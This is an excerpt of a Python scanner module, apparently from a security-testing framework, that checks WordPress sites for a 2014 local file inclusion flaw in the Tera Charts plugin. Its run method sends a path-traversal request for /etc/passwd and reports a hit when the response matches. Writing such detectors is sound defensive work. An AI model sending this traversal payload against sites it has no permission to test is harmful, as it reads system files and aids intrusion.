#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Multiple local file inclusion vulnerabilities in Tera Charts (tera-charts) plugin 0."""
...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Plugin Tera Charts - Local File Inclusion Detection',
        ...
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2014', 'wordpress', 'wp-plugin', 'lfi', 'tera_charts_plugin_project', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/tera-charts/charts/zoomabletreemap.php?fn=../../../../../etc/passwd', allow_redirects=False)
        ...
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="WordPress Plugin Tera Charts - Local File Inclusion detected",
                path='/wp-content/plugins/tera-charts/charts/zoomabletreemap.php?fn=../../../../../etc/passwd',
            )
            return True
        return False
